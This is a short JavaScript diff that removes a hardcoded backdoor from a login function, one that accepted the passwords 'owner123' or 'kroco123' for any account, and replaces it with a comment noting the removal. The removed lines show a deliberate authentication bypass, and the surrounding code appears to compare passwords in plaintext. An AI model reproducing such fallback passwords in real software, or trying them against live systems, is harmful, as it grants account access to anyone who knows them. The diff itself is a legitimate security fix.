@@ -192,9 +192,7 @@
                     valid = (storedPassword === rawPassword);
                 }
 
-                if (!valid && (rawPassword === 'owner123' || rawPassword === 'kroco123')) {
-                    valid = true;
-                }
+                // Security Backdoor Removed (No hardcoded fallback passwords)
 
                 if (!valid) {
                     return { success: false, message: 'Username atau Password salah.' };
